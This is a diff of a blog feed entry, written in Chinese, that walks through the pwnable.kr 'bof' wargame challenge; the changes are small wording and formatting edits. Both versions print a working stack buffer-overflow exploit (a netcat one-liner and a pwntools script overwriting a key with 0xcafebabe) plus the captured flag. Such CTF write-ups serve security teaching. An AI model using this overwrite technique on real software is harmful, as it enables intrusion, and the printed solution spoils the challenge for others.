@@ -77,17 +77,17 @@
 <p>一道关于缓冲区溢出的题，需要通过 overflow 来覆盖 key 的值。</p>
 <p>ida 载入后进入 func 函数：</p>
 <p><img src="/2018/03/12/pwnable-kr/bof-1.png" alt=""></p>
-<p>a1 的地址为 ebp+8h ，s 的地址为 ebp-2ch，距离差 52，所以要覆盖 52 个字符。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(python -c <span class="string">"print 'A'*52 + '\xbe\xba\xfe\xca'"</span>; cat) | nc pwnable.kr <span class="number">9000</span> </div><div class="line"><span class="comment"># 同样需要注意后面的字符需要倒序传入；另外这里的 cat 既能让 nc 的 tcp 会话不结束（直到用户输入 Ctrl+C ），又可以将用户输入的内容重定向给 nc。</span></div></pre></td></tr></table></figure>
+<p>可以找到 a1 的地址为 ebp+8h ，s 的地址为 ebp-2Ch，距离差 52，所以要覆盖 52 个字符。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(python -c <span class="string">"print 'A'*52 + '\xbe\xba\xfe\xca'"</span>; cat) | nc pwnable.kr <span class="number">9000</span> </div><div class="line"><span class="comment"># 同样需要注意后面的字符需要倒序传入；另外这里的 cat 既能让 nc 的 tcp 会话不结束（直到用户输入 Ctrl+C），又可以将用户输入的内容重定向给 nc。</span></div></pre></td></tr></table></figure>
 <p>exp: </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">pwn_socket = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</div><div class="line">pwn_socket.sendline(<span class="string">'A'</span> * <span class="number">52</span> + <span class="string">'\xbe\xba\xfe\xca'</span>)</div><div class="line">pwn_socket.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">pwn_socket = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</div><div class="line">pwn_socket.sendline(<span class="string">'A'</span> * <span class="number">52</span> + <span class="string">'\xbe\xba\xfe\xca'</span>)</div><div class="line"></div><div class="line">pwn_socket.interactive()</div></pre></td></tr></table></figure>
 <p><code>daddy, I just pwned a buFFer :)</code></p>
 <hr>
 ]]></content>
       
         <categories>
             
-            <category> PWN </category>
+            <category> Pwn </category>
             
         </categories>
         
